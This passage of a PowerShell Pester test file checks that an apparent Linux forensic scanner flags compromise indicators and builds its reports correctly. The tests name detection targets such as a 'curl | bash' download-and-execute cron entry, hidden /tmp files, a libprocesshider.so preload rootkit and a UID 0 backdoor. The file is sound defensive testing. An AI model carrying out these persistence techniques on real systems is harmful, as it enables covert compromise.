            # root logged in from 192.168.1.100 (after brute force)
            # john from 192.168.1.50, admin from 203.0.113.99
            # This test checks if any AUTH-005 was generated
            # Note: depends on auth.log data - may or may not trigger
            $multiIP = $script:authFindings | Where-Object { $_.Id -eq 'AUTH-005' }
            # At least the summary should exist even if AUTH-005 doesn't trigger
            $script:authFindings.Count | Should -BeGreaterThan 2
        }

        It 'Should include an informational authentication summary (AUTH-008)' {
            $summary = $script:authFindings | Where-Object { $_.Id -eq 'AUTH-008' }
            $summary | Should -Not -BeNullOrEmpty
            $summary.Severity | Should -Be 'Informational'
        }

        It 'Should reference MITRE T1110 for brute force findings' {
            $bruteForce = @($script:authFindings | Where-Object { $_.Id -eq 'AUTH-001' -or $_.Id -eq 'AUTH-002' })
            $bruteForce | Should -Not -BeNullOrEmpty
            $bruteForce[0].MITRE | Should -BeLike '*T1110*'
        }
    }

    Context 'CronAnalyzer' {

        BeforeAll {
            $rules = if ($Script:DefaultRules) { $Script:DefaultRules } else { @{} }
            $script:cronFindings = Invoke-CronAnalyzer -EvidencePath $TestDataPath -Rules $rules
        }

        It 'Should return findings' {
            $script:cronFindings.Count | Should -BeGreaterThan 0
        }

        It 'Should detect cron job executing from suspicious /tmp path (CRON-002)' {
            $tmpCron = @($script:cronFindings | Where-Object { $_.Id -eq 'CRON-002' })
            $tmpCron | Should -Not -BeNullOrEmpty
            ($tmpCron | ForEach-Object { $_.Evidence -join ' ' }) -join ' ' | Should -BeLike '*/tmp/*'
        }

        It 'Should detect download-and-execute cron entry (curl | bash)' {
            $dlExec = $script:cronFindings | Where-Object {
                $_.Id -eq 'CRON-004' -or $_.Id -eq 'CRON-001'
            }
            $dlExec | Should -Not -BeNullOrEmpty
        }

        It 'Should detect hidden file in cron referencing /tmp/.hidden' {
            $allEvidence = ($script:cronFindings | ForEach-Object { $_.Evidence -join ' ' }) -join ' '
            $allEvidence | Should -BeLike '*/tmp/.hidden*'
        }

        It 'Should reference MITRE T1053.003 for cron persistence' {
            $cronPersistence = $script:cronFindings | Where-Object { $_.Id -like 'CRON-0*' -and $_.Severity -ne 'Informational' }
            if ($cronPersistence) {
                $cronPersistence[0].MITRE | Should -BeLike '*T1053*'
            }
        }

        It 'Should include an informational cron summary (CRON-006)' {
            $summary = $script:cronFindings | Where-Object { $_.Id -eq 'CRON-006' }
            $summary | Should -Not -BeNullOrEmpty
            $summary.Severity | Should -Be 'Informational'
        }
    }

    Context 'LDPreloadAnalyzer' {

        BeforeAll {
            $rules = if ($Script:DefaultRules) { $Script:DefaultRules } else { @{} }
            $script:ldFindings = Invoke-LDPreloadAnalyzer -EvidencePath $TestDataPath -Rules $rules
        }

        It 'Should return findings' {
            $script:ldFindings.Count | Should -BeGreaterThan 0
        }

        It 'Should detect ld.so.preload entries (libprocesshider.so) as Critical (LDPRE-001)' {
            $preload = $script:ldFindings | Where-Object { $_.Id -eq 'LDPRE-001' }
            $preload | Should -Not -BeNullOrEmpty
            $preload.Severity | Should -Be 'Critical'
            ($preload.Evidence -join ' ') | Should -BeLike '*libprocesshider*'
        }

        It 'Should flag ld.so.preload with MITRE T1574.006' {
            $preload = $script:ldFindings | Where-Object { $_.Id -eq 'LDPRE-001' }
            $preload.MITRE | Should -Be 'T1574.006'
        }

        It 'Should describe the finding as a rootkit/backdoor indicator' {
            $preload = $script:ldFindings | Where-Object { $_.Id -eq 'LDPRE-001' }
            $preload.Description | Should -BeLike '*rootkit*'
        }
    }

    Context 'SysctlAnalyzer' {

        BeforeAll {
            $rules = if ($Script:DefaultRules) { $Script:DefaultRules } else { @{} }
            $script:sysctlFindings = Invoke-SysctlAnalyzer -EvidencePath $TestDataPath -Rules $rules
        }

        It 'Should return findings' {
            $script:sysctlFindings.Count | Should -BeGreaterThan 0
        }

        It 'Should detect ASLR disabled (kernel.randomize_va_space=0) as High' {
            $aslr = $script:sysctlFindings | Where-Object { $_.Title -like '*ASLR*' }
            $aslr | Should -Not -BeNullOrEmpty
            $aslr.Severity | Should -Be 'High'
        }

        It 'Should detect IP forwarding enabled as Medium' {
            $ipfwd = $script:sysctlFindings | Where-Object { $_.Title -like '*IP forwarding*' }
            $ipfwd | Should -Not -BeNullOrEmpty
            $ipfwd.Severity | Should -Be 'Medium'
        }

        It 'Should detect ICMP redirects accepted as Medium' {
            $redirects = $script:sysctlFindings | Where-Object { $_.Title -like '*ICMP redirects*' }
            $redirects | Should -Not -BeNullOrEmpty
        }

        It 'Should detect SYN cookies disabled' {
            $syn = $script:sysctlFindings | Where-Object { $_.Title -like '*SYN cookies*' }
            $syn | Should -Not -BeNullOrEmpty
        }

        It 'Should detect hardlink protection disabled' {
            $hl = $script:sysctlFindings | Where-Object { $_.Title -like '*Hardlink*' }
            $hl | Should -Not -BeNullOrEmpty
        }

        It 'Should detect symlink protection disabled' {
            $sl = $script:sysctlFindings | Where-Object { $_.Title -like '*Symlink*' }
            $sl | Should -Not -BeNullOrEmpty
        }

        It 'Should include an informational sysctl summary (SYSCTL-INFO)' {
            $summary = $script:sysctlFindings | Where-Object { $_.Id -eq 'SYSCTL-INFO' }
            $summary | Should -Not -BeNullOrEmpty
            $summary.Severity | Should -Be 'Informational'
        }
    }
}

# =====================================================================
# 4. Full Scan Integration Test
# =====================================================================
Describe 'Full Scan Integration Test' {

    Context 'Invoke-LinuxArtifactScan against TestData' {

        BeforeAll {
            # Run a full scan against the TestData with reports suppressed
            $script:scanResult = Invoke-LinuxArtifactScan `
                -EvidencePath $TestDataPath `
                -SkipHtmlReport `
                -SkipCsvReport `
                -MinimumSeverity 'Informational'
        }

        It 'Should return a non-null result' {
            $script:scanResult | Should -Not -BeNullOrEmpty
        }

        It 'Should have PSTypeName PWSPostProcessingSuite.ScanResult' {
            $script:scanResult.PSTypeNames | Should -Contain 'PWSPostProcessingSuite.ScanResult'
        }

        It 'Should have TotalFindings as a non-negative integer' {
            $script:scanResult.TotalFindings | Should -BeGreaterOrEqual 0
        }

        It 'Should have a non-empty Findings array' {
            $script:scanResult.Findings | Should -Not -BeNullOrEmpty
        }

        It 'Should have Findings count matching TotalFindings' {
            @($script:scanResult.Findings).Count | Should -Be $script:scanResult.TotalFindings
        }

        It 'Should have a BySeverity hashtable with all five severity levels' {
            $script:scanResult.BySeverity | Should -Not -BeNullOrEmpty
            $script:scanResult.BySeverity.Keys | Should -Contain 'Critical'
            $script:scanResult.BySeverity.Keys | Should -Contain 'High'
            $script:scanResult.BySeverity.Keys | Should -Contain 'Medium'
            $script:scanResult.BySeverity.Keys | Should -Contain 'Low'
            $script:scanResult.BySeverity.Keys | Should -Contain 'Informational'
        }

        It 'Should have BySeverity counts that sum to TotalFindings' {
            $sum = $script:scanResult.BySeverity.Critical +
                   $script:scanResult.BySeverity.High +
                   $script:scanResult.BySeverity.Medium +
                   $script:scanResult.BySeverity.Low +
                   $script:scanResult.BySeverity.Informational
            $sum | Should -Be $script:scanResult.TotalFindings
        }

        It 'Should have a Timeline array' {
            # Timeline may have entries from auth log findings
            $script:scanResult | Should -Not -BeNullOrEmpty
            # Timeline is an array property (may be empty if no timestamped findings)
            , $script:scanResult.Timeline | Should -Not -BeNullOrEmpty
        }

        It 'Should have Metadata with expected properties' {
            $meta = $script:scanResult.Metadata
            $meta | Should -Not -BeNullOrEmpty
            $meta.EvidencePath    | Should -Not -BeNullOrEmpty
            $meta.StructureType   | Should -Be 'mirror'
            $meta.ScanStart       | Should -Not -BeNullOrEmpty
            $meta.ScanEnd         | Should -Not -BeNullOrEmpty
            $meta.ScanDuration    | Should -Not -BeNullOrEmpty
            $meta.AnalyzersRun    | Should -BeGreaterThan 0
            $meta.AnalyzerResults | Should -Not -BeNullOrEmpty
        }

        It 'Should have a ReportPaths property' {
            # With both reports skipped, ReportPaths should exist but be empty
            $script:scanResult.ReportPaths | Should -Not -BeNull
        }

        It 'Should detect the evidence structure as mirror' {
            $script:scanResult.Metadata.StructureType | Should -Be 'mirror'
        }
    }

    Context 'Critical findings are detected in full scan' {

        BeforeAll {
            $script:scanResult = Invoke-LinuxArtifactScan `
                -EvidencePath $TestDataPath `
                -SkipHtmlReport `
                -SkipCsvReport `
                -MinimumSeverity 'Informational'
        }

        It 'Should detect at least one Critical finding' {
            $script:scanResult.BySeverity.Critical | Should -BeGreaterThan 0
        }

        It 'Should detect at least one High finding' {
            $script:scanResult.BySeverity.High | Should -BeGreaterThan 0
        }

        It 'Should detect at least one Medium finding' {
            $script:scanResult.BySeverity.Medium | Should -BeGreaterThan 0
        }

        It 'Should detect at least one Informational finding' {
            $script:scanResult.BySeverity.Informational | Should -BeGreaterThan 0
        }

        It 'Critical findings should include UID 0 backdoor (ACCT-001)' {
            $uid0 = $script:scanResult.Findings | Where-Object {
                $_.Severity -eq 'Critical' -and $_.Id -eq 'ACCT-001'
            }
            $uid0 | Should -Not -BeNullOrEmpty
        }

        It 'Critical findings should include NOPASSWD ALL in sudoers (SUDO-001)' {
            $nopasswd = $script:scanResult.Findings | Where-Object {
                $_.Severity -eq 'Critical' -and $_.Id -eq 'SUDO-001'
            }
            $nopasswd | Should -Not -BeNullOrEmpty
        }

        It 'Critical findings should include PermitRootLogin yes (SSH-001)' {
            $rootLogin = $script:scanResult.Findings | Where-Object {
                $_.Severity -eq 'Critical' -and $_.Id -eq 'SSH-001'
            }
            $rootLogin | Should -Not -BeNullOrEmpty
        }

        It 'Critical findings should include ld.so.preload entries (LDPRE-001)' {
            $ldpre = $script:scanResult.Findings | Where-Object {
                $_.Severity -eq 'Critical' -and $_.Id -eq 'LDPRE-001'
            }
            $ldpre | Should -Not -BeNullOrEmpty
        }

        It 'Critical findings should include brute force success (AUTH-001)' {
            $brute = $script:scanResult.Findings | Where-Object {
                $_.Severity -eq 'Critical' -and $_.Id -eq 'AUTH-001'
            }
            $brute | Should -Not -BeNullOrEmpty
        }
    }

    Context 'Severity breakdown is correct' {

        BeforeAll {
            $script:scanResult = Invoke-LinuxArtifactScan `
                -EvidencePath $TestDataPath `
                -SkipHtmlReport `
                -SkipCsvReport `
                -MinimumSeverity 'Informational'
        }

        It 'Findings should be sorted by severity (Critical first, Informational last)' {
            $severityOrder = @{ 'Critical' = 0; 'High' = 1; 'Medium' = 2; 'Low' = 3; 'Informational' = 4 }
            $findings = @($script:scanResult.Findings)
            if ($findings.Count -ge 2) {
                $firstSev = $severityOrder[$findings[0].Severity]
                $lastSev  = $severityOrder[$findings[-1].Severity]
                $firstSev | Should -BeLessOrEqual $lastSev
            }
        }

        It 'Every finding should have a valid Severity value' {
            $validSeverities = @('Critical', 'High', 'Medium', 'Low', 'Informational')
            foreach ($finding in $script:scanResult.Findings) {
                $finding.Severity | Should -BeIn $validSeverities
            }
        }

        It 'Every finding should have a non-empty Id' {
            foreach ($finding in $script:scanResult.Findings) {
                $finding.Id | Should -Not -BeNullOrEmpty
            }
        }

        It 'Every finding should have a non-empty Title' {
            foreach ($finding in $script:scanResult.Findings) {
                $finding.Title | Should -Not -BeNullOrEmpty
            }
        }

        It 'Every finding should have a non-empty Description' {
            foreach ($finding in $script:scanResult.Findings) {
                $finding.Description | Should -Not -BeNullOrEmpty
            }
        }

        It 'Every finding should have a non-empty Category' {
            foreach ($finding in $script:scanResult.Findings) {
                $finding.Category | Should -Not -BeNullOrEmpty
            }
        }
    }

    Context 'Scan with IncludeAnalyzers filter' {

        It 'Should run only the specified analyzer when IncludeAnalyzers is set' {
            $filteredResult = Invoke-LinuxArtifactScan `
                -EvidencePath $TestDataPath `
                -IncludeAnalyzers 'UserAccount' `
                -SkipHtmlReport -SkipCsvReport

            $filteredResult.Metadata.AnalyzersRun | Should -Be 1
            # Should contain ACCT findings
            $acct = $filteredResult.Findings | Where-Object { $_.Id -like 'ACCT-*' }
            $acct | Should -Not -BeNullOrEmpty
            # Should not contain SSH or SUDO findings
            $ssh  = $filteredResult.Findings | Where-Object { $_.Id -like 'SSH-*' }
            $ssh | Should -BeNullOrEmpty
            $sudo = $filteredResult.Findings | Where-Object { $_.Id -like 'SUDO-*' }
            $sudo | Should -BeNullOrEmpty
        }

        It 'Should run multiple specified analyzers' {
            $filteredResult = Invoke-LinuxArtifactScan `
                -EvidencePath $TestDataPath `
                -IncludeAnalyzers 'UserAccount', 'SSHConfig' `
                -SkipHtmlReport -SkipCsvReport

            $filteredResult.Metadata.AnalyzersRun | Should -Be 2
            $acct = $filteredResult.Findings | Where-Object { $_.Id -like 'ACCT-*' }
            $acct | Should -Not -BeNullOrEmpty
            $ssh  = $filteredResult.Findings | Where-Object { $_.Id -like 'SSH-*' }
            $ssh | Should -Not -BeNullOrEmpty
        }
    }

    Context 'Scan with ExcludeAnalyzers filter' {

        It 'Should exclude the specified analyzer' {
            $filteredResult = Invoke-LinuxArtifactScan `
                -EvidencePath $TestDataPath `
                -ExcludeAnalyzers 'UserAccount' `
                -SkipHtmlReport -SkipCsvReport

            # Should not contain ACCT findings
            $acct = $filteredResult.Findings | Where-Object { $_.Id -like 'ACCT-*' }
            $acct | Should -BeNullOrEmpty
            # Should still have other findings
            $filteredResult.TotalFindings | Should -BeGreaterThan 0
        }
    }

    Context 'Scan with MinimumSeverity filter' {

        It 'Should exclude findings below the minimum severity threshold' {
            $highResult = Invoke-LinuxArtifactScan `
                -EvidencePath $TestDataPath `
                -MinimumSeverity 'High' `
                -SkipHtmlReport -SkipCsvReport

            $lowFindings  = $highResult.Findings | Where-Object { $_.Severity -eq 'Low' }
            $infoFindings = $highResult.Findings | Where-Object { $_.Severity -eq 'Informational' }
            $medFindings  = $highResult.Findings | Where-Object { $_.Severity -eq 'Medium' }

            $lowFindings  | Should -BeNullOrEmpty
            $infoFindings | Should -BeNullOrEmpty
            $medFindings  | Should -BeNullOrEmpty

            # Should still have Critical and High findings
            $highResult.BySeverity.Critical | Should -BeGreaterThan 0
            $highResult.BySeverity.High     | Should -BeGreaterThan 0
        }
    }

    Context 'Reporting functions' {

        BeforeAll {
            $script:testFindings = @(
                (New-Finding -Id 'RPT-001' -Severity 'Critical' -Category 'Test' -Title 'Critical Test' -Description 'Critical finding' -MITRE 'T1078')
                (New-Finding -Id 'RPT-002' -Severity 'High' -Category 'Test' -Title 'High Test' -Description 'High finding')
                (New-Finding -Id 'RPT-003' -Severity 'Low' -Category 'Test' -Title 'Low Test' -Description 'Low finding')
            )
        }

        It 'Export-CsvReport should create a CSV file with all findings' {
            $csvPath = Join-Path $TestDrive 'test_report.csv'
            Export-CsvReport -Findings $script:testFindings -OutputPath $csvPath
            Test-Path $csvPath | Should -BeTrue
            $csv = Import-Csv $csvPath
            $csv.Count | Should -Be 3
        }

        It 'Export-HtmlReport should create an HTML file with finding details' {
            $htmlPath = Join-Path $TestDrive 'test_report.html'
            $metadata = [PSCustomObject]@{
                EvidencePath  = '/test'
                ScanStart     = (Get-Date)
                ScanEnd       = (Get-Date)
                ScanDuration  = [timespan]::FromSeconds(5)
                AnalyzersRun  = 3
            }
            Export-HtmlReport -Findings $script:testFindings -Timeline @() -OutputPath $htmlPath -ScanMetadata $metadata
            Test-Path $htmlPath | Should -BeTrue
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match 'Critical Test'
        }

        It 'Write-ConsoleSummary should run without errors' {
            $bySeverity = @{ Critical = 1; High = 1; Medium = 0; Low = 1; Informational = 0 }
            { Write-ConsoleSummary -Findings $script:testFindings -BySeverity $bySeverity } | Should -Not -Throw
        }
    }
}
